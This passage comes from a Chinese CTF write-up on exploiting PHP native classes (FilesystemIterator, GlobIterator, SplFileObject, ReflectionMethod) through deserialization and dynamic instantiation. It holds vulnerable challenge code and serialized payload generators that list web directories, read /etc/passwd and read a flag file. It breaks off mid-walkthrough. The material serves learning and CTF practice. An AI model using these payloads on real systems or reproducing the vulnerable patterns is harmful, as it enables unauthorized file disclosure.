<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">其中cmd=<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="comment">$a = new FilesystemIterator(&quot;/*&quot;);foreach($a as $f)&#123;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;</span></span><br></pre></td></tr></table></figure>
<p>前面都是读取文件目录，下面是可以读取文件内容</p>
<h4 id="可读取文件类"><a class="markdownIt-Anchor" href="#可读取文件类"></a> 可读取文件类</h4>
<h5 id="splfileobject-类"><a class="markdownIt-Anchor" href="#splfileobject-类"></a> SplFileObject 类</h5>
<p><a href="https://www.php.net/manual/zh/class.splfileobject.php">官方文档</a></p>
<p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作</p>
<p>测试：</p>
<p>读取文件的一行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure>
<p>对文件中的每一行内容进行遍历</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="极客大挑战-soezunser"><a class="markdownIt-Anchor" href="#极客大挑战-soezunser"></a> 极客大挑战-SoEzUnser</h5>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121664208">博客推荐</a></p>
<h5 id="2021-mar-dasctf-明御攻防赛ez_serialize"><a class="markdownIt-Anchor" href="#2021-mar-dasctf-明御攻防赛ez_serialize"></a> [2021 MAR DASCTF 明御攻防赛]ez_serialize</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">B</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;<span class="title">ctfer</span>&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> <span class="title">new</span>  $<span class="title">this</span>-&gt;<span class="title">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__wakeup</span>()    // 可以直接绕过<span class="title">__wakeup</span>()方法的执行</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;para) &amp;&amp; <span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>)) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">        <span class="title">else</span></span></span><br><span class="line"><span class="class">            <span class="title">die</span>(&#x27;<span class="title">bad</span> <span class="title">hacker</span>~&#x27;);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是一样的，先代码审计，发现没有什么危险函数的利用，我们可以利用原生类来利用了</p>
<p>首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator(&quot;/var/www/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE：</p>
<p>然后进入这个文件夹</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator(&quot;/var/www/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>看到flag.php</p>
<p>现在我们只需要读取文件内容，利用<code>SplFileObject类</code></p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;SplFileObject&#x27;</span>;    </span><br><span class="line">    <span class="comment">// SplFileObject(&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>);</span><br></pre></td></tr></table></figure>
<p>能否利用原生类读取文件内容和文件目录？</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">echo <span class="keyword">new</span>  <span class="type"></span>$<span class="built_in">this</span>-&gt;<span class="class"><span class="keyword">class</span> (</span>$<span class="built_in">this</span>-&gt;para)</span><br></pre></td></tr></table></figure>
<p>这行代码比较关键，就是能否利用原生类的关键</p>
<h4 id="使用-reflectionmethod-类获取类方法的相关信息"><a class="markdownIt-Anchor" href="#使用-reflectionmethod-类获取类方法的相关信息"></a> 使用 ReflectionMethod 类获取类方法的相关信息</h4>
<h5 id="reflectionmethod"><a class="markdownIt-Anchor" href="#reflectionmethod"></a> ReflectionMethod</h5>
<p><strong>ReflectionMethod</strong> 类报告了一个方法的有关信息。可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReflectionMethod</span> <span class="keyword">extends</span> <span class="title">ReflectionFunctionAbstract</span> <span class="keyword">implements</span> <span class="title">Reflector</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    	</span><br><span class="line"><span class="comment">/*方法*/</span></span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__construct</span> — ReflectionMethod 的构造函数</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">export</span> — 输出一个回调方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getClosure</span> — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getDeclaringClass</span> — 获取被反射的方法所在类的反射实例</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getModifiers</span> — 获取方法的修饰符</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getPrototype</span> — 返回方法原型 (如果存在)</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">invoke</span> — Invoke</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">invokeArgs</span> — 带参数执行</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isAbstract</span> — 判断方法是否是抽象方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isConstructor</span> — 判断方法是否是构造方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isDestructor</span> — 判断方法是否是析构方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isFinal</span> — 判断方法是否定义 <span class="keyword">final</span></span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isPrivate</span> — 判断方法是否是私有方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isProtected</span> — 判断方法是否是保护方法 (<span class="keyword">protected</span>)</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isPublic</span> — 判断方法是否是公开方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isStatic</span> — 判断方法是否是静态方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">setAccessible</span> — 设置方法是否访问</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span> — 返回反射方法对象的字符串表达</span><br><span class="line">        </span><br><span class="line"><span class="comment">/*继承的方法*/</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">__clone</span>(): <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getAttributes</span>(?<span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getClosureScopeClass</span>(): ?ReflectionClass</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getClosureThis</span>(): <span class="keyword">object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getDocComment</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getEndLine</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getExtension</span>(): ReflectionExtension</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getExtensionName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getFileName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNamespaceName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNumberOfParameters</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNumberOfRequiredParameters</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getParameters</span>(): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getReturnType</span>(): ?ReflectionType</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getShortName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getStartLine</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getStaticVariables</span>(): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">hasReturnType</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">inNamespace</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isClosure</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isDeprecated</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isGenerator</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isInternal</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isUserDefined</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isVariadic</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">returnsReference</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">__toString</span>(): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
<p>ReflectionMethod 类中有很多继承方法可以使用，比如这个 <code>getDocComment()</code> 方法，我们可以用它来获取类中各个函数注释内容，如下图所示（借用下图）</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4bed8c444b5d6640cfde958fa1b83753-166727395787411.png" alt="image-20210516101052113"></p>
<h5 id="2021-ciscneasy_source"><a class="markdownIt-Anchor" href="#2021-ciscneasy_source"></a> [2021 CISCN]easy_source</h5>
<p>先看代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];    <span class="comment">// 传入原生类名</span></span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];    <span class="comment">// 传入类属性</span></span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];    <span class="comment">// 传入类属性</span></span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];    <span class="comment">// 传入类方法</span></span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);    <span class="comment">// 实例化刚才传入的原生类</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());     <span class="comment">// 调用类中的方法</span></span><br></pre></td></tr></table></figure>
<p>首先看到这两行代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure>
<p>类似于上面的题，需要利用原生类</p>
<p>这个题，我开始想到还是用<code>FilesystemIterator</code></p>
<p>如果得到文件路径，然后还是用<code>SplFileObject</code>来读取文件内容</p>
<p>但是这个考<code>ReflectionMethod</code></p>
